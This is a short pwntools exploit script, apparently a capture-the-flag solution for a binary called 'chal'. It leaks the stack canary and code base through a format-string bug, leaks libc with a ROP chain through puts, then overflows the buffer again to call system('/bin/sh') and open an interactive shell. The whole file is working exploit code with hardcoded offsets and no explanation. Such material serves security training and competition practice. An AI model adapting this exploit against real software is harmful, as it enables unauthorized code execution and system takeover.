#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./chal")

shell.sendlineafter(b": ", b"%45$p.%49$p")
shell.recvuntil(b"Welcome ")

leak = shell.recvline().strip().decode().split(".")

canary = int(leak[0], 16)
binary_base = int(leak[1], 16) - 0x1230

offset = 120
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8
payload += p64(binary_base + 0x119d) # pop rdi; ret;
payload += p64(binary_base + 0x4000) # puts@got
payload += p64(binary_base + 0x1030) # puts@plt
payload += p64(binary_base + 0x1230) # main()

shell.sendlineafter(b": ", payload)
shell.recvline_contains(b"+     o")

libc_base = u64(shell.recvline().strip(b"\n").ljust(8, b"\x00")) - 0x89620

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8
payload += p64(libc_base + 0x026665) # pop rdi; ret;
payload += p64(libc_base + 0x1b7de3) # "/bin/sh"
payload += p64(libc_base + 0x024606) # ret;
payload += p64(libc_base + 0x057a50) # system()

shell.sendlineafter(b": ", b"A" * 8)
shell.sendlineafter(b": ", payload)
shell.recvline_contains(b"+     o")

shell.interactive()
